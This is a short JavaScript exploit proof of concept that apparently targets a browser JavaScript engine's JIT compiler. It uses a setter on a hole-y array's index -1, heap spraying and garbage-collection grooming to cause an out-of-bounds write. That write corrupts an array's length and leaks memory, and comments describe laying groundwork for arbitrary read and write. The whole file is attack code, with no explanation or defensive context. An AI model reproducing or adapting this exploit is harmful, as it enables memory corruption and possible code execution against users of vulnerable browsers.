let arr1 = [];
let arr2 = [1.2, 1.2, , 1.2];
let victimArr = [1.1, 1.1, , 1.1];			//this will be used for arb_read and arb_write
let Spray = [];
let arrHolder = [];
let uInt32Array = new Uint32Array(0x100);
let uInt8Array = new Uint8Array(0x100);
const ArraySize = 0x10;

function gc(){
	for(let i = 0; i < 0x40000; i++) 
	{
		Spray.push(new Uint32Array(ArraySize));
	}
}

function reclaimSpace(){
	for (var i = 0; i < 0x4000; i++){
		let a = new Uint32Array(0x4);
		arrHolder.push(a);
	}
}

arr2.__defineSetter__("-1", function(x) {
	arr1.length = 0;
	arr2.length = 0;
	gc();
	reclaimSpace();
	Math.atan2(arr1);
	Math.atan2(arr2);
	Math.atan2(arrHolder[0]);
});

{
    function f(b, index, arr1Index) {
        arr1[arr1Index] = 1.1;
		arr1[arr1Index + 1] = 1.2;

        arr2[index] = 1.1;
		
		//this OOB write into arr2 which is most likely in tenured heap already
		arr1[arr1Index] = 0x4242;
    }	
    for (let i = 0; i < 0x10000; i++) {
        arr2.length = 4;
        f((i & 1) === 1, 5, 0x60);
    }
    console.log(f(true, -1, 10));
	if (arr2[6] != 0)
	{
		console.log("Arr2 is corrupted");	
		console.log("Arr2's length: ", arr2.length);
		console.log("Arr2 leak: ", arr2[6]);
	}
}

/*
bp js!js::math_atan2
*/
